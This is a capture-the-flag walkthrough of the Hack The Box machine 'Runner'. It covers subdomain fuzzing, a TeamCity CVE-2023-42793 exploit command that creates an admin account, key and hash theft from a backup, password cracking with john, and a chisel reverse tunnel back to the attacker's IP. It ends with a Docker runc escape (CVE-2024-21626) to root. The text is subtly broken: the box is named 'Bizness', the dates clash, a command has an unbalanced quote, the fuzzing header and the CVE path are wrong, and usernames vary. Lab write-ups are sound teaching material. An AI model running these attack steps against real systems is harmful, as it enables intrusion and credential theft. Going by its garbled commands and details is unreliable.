---
title: HTB - Runner
description: HTB - Runner
publishDate: 2023-06-07
categories:
  - HackTheBox
tags:
  - HackTheBox
  - wfuzz
  - TeamCity
  - ssh
  - john
  - chisel
  - portainer
  - docker
  - fuzz
  - Port-Forwarding
---

## Box Info

| Name                  | Bizness          | 
| :-------------------- | ---------------: |
| Release Date          | 08 Jun, 2024     |
| OS                    | Linux            |
| Rated Difficulty      | Medium           |

## Enumeration

### Nmap

![Image](0.png)

### Resolution DNS

```bash
echo "10.10.11.13 runner.htb | sudo tee -a /etc/hosts
```

### Scanning SubDomain

```bash
wfuzz -c -w /usr/share/wordlists/amass/shubs-subdomains.txt --hc 400,404,403,302 -H "Hosts: FUZZ.runner.htb" -u http://runner.htb -t 100
```

![Image](1.png)

```bash
Whatweb http://runner.htb
```
## CVE-2023-42793 for Jet Brains

We can see the version of `TeamCity build management server`.

![Image](2.png)

Googling `Teamcity 2023.05.3` exploit i found a `RCE` vulnerability for it.

![Image](3.png)

PoC[^poc]: <https://github.com/Zyad-Elsayed/CVE-2023-42793>

```bash
python3 exploit.py -u http://teamcity.runner.htb -n test2 -p test122 -e test2@test.com
```

![Image](4.png)

The script exploits to create an admin account on a TeamCity server. It sends a POST request to the target URL to create an admin user with specified or random credentials.

![Image](5.png)

## SSH

Once inside, I enumerate these sections and found in Diagnostics make a backup and storage in a zip file and can we display the folders and found id_rsa.

![Image](6.png)

We go to download and save for login with ssh.

![Image](7.png)

Wait.. but dont have a user for login with ssh...

![Image](8.png)

We also found users and there hashes in same folder.

![Image](9.png)

## Crack Hash

We go to crack the password for it.

![Image](10.png)

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt
```
Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3]) Remaining 1 password hash Cost 1 (iteration count) is 128 for all loaded hashes Will run 2 OpenMP threads

Password: `piper123`

Till now we have one id_rsa file, two users (Methew, jhon),password for Methew.

`ssh -i id_rsa john@10.10.11.13`

![Image](12.png)

![Image](11.png)

## Port Forwarding

```bash
netstat -nltp
ss -nltpu
```

127.0.0.1:9000 its potential, I’ll be employing Chisel for port forwarding.

![Image](13.png)

```bash
chisel server -p 6150 --reverse (Attack Machine)
./chisel client 10.10.14.68:6150 R:9000:127.0.0.1:9000 (Victim machine)
```

![Image](14.png)

We go to our port 9000

![Image](15.png)

## Docker

Login with credentials `matthew` - `piper123`

<https://nitroc.org/en/posts/cve-2024-21626-illustrated/#how-docker-engine-calls-runc>

![Image](16.png)

## CVE-2024-21626 for Docker

![Image](17.png)

the path `/proc/self/id/8` is from the [CVE-2024-21626](https://nitroc.org/en/posts/cve-2024-21626-illustrated/#how-docker-engine-calls-runc) - [PoC - GitHub](https://github.com/NitroCao/CVE-2024-21626?tab=readme-ov-file)

![Image](18.png)

Now we go to console

![Image](19.png)

Execute a `/bin/bash` as root

![Image](20.png)

Just login as root and look the folder `root` for the flag

![Image](21.png)

Root

#### Source
[^poc]: <https://github.com/Zyad-Elsayed/CVE-2023-42793>